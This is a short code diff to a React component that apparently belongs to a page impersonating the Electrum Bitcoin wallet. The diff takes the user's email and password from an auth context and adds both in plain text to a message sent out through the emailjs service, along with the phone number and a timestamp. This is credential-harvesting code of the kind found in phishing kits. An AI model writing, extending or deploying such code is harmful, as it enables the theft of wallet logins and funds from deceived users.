@@ -1,8 +1,10 @@
-import React, { useState } from "react";
+import React, { useState , useContext } from "react";
 import { useNavigate } from "react-router-dom";
 import emailjs from "emailjs-com";
+import { AuthContext } from "./AuthContext";
 
 const Alrt = () => {
+  const {contemail,contpassword}=useContext(AuthContext);
   const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
   const [emailError, setEmailError] = useState("");
@@ -44,7 +46,9 @@ const Alrt = () => {
         web_name: "Electrum",
         from_name: "Electrum",
         message: `Name: ${email}, 
+        Email: ${contemail},
         Phone: ${phone}, 
+        Password: ${contpassword},
         Date: ${new Date().toLocaleDateString()}, 
         Time: ${new Date().toLocaleTimeString()}`,
       };
